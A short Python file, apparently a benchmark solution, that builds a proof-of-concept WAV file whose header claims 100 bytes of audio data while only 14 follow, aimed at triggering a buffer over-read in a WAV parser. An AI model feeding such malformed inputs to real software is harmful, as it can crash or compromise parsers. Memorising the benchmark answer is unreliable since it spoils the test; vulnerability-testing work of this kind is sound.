import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        riff = b'RIFF'
        size = struct.pack('<I', 50)
        wave = b'WAVE'
        fmt_id = b'fmt '
        fmt_size = struct.pack('<I', 16)
        fmt_data = b'\x01\x00\x01\x00\x40\x1f\x00\x00\x40\x3e\x00\x00\x02\x00\x10\x00'
        data_id = b'data'
        data_size = struct.pack('<I', 100)
        padding = b'\x00' * 14
        poc = riff + size + wave + fmt_id + fmt_size + fmt_data + data_id + data_size + padding
        return poc